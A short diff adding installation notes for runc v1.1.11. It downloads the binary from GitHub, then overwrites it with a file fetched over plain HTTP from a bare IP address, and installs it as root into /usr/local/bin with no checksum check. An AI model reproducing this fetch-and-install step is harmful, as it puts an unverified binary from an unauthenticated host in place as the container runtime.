@@ -1,0 +1,10 @@
+KUBERNETES RUNC, 202405
+
+wget -c "https://github.com/opencontainers/runc/releases/download/v1.1.11/runc.amd64" -O runc
+wget -c "http://199.115.230.237:12345/kubernetes/runc_v1.1.11/runc" -O runc
+
+chown root:root runc
+
+chmod +x runc
+
+cp -a runc /usr/local/bin/
